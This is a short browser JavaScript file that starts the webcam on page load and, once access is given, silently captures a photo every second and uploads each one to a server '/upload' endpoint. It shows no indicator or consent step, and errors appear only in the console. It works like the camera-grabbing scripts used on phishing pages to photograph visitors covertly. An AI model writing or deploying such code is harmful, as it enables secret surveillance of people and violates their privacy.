document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    function checkCameraPermission() {
        navigator.permissions.query({ name: 'camera' })
            .then(permissionStatus => {
                if (permissionStatus.state === 'granted') {
                    startCamera();
                } else if (permissionStatus.state === 'prompt') {
                    startCamera();
                } else {
                    alert('Camera permission is required to use this feature.');
                }
            })
            .catch(err => {
                console.error('Permission API error:', err);
                startCamera();
            });
    }

    function startCamera() {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                autoCapturePhotos(); // Start auto-capturing photos
            })
            .catch(err => {
                console.error('Error accessing camera:', err);
                alert('Unable to access the camera. Please check your camera permissions.');
            });
    }

    function captureAndUpload() {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');

            fetch('/upload', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => console.log('Photo uploaded:', result))
            .catch(error => console.error('Error uploading photo:', error));
        }, 'image/jpeg');
    }

    function autoCapturePhotos() {
        const captureInterval = 1000; // 1 second
        setInterval(captureAndUpload, captureInterval);
    }

    // Start by checking camera permission
    checkCameraPermission();
});
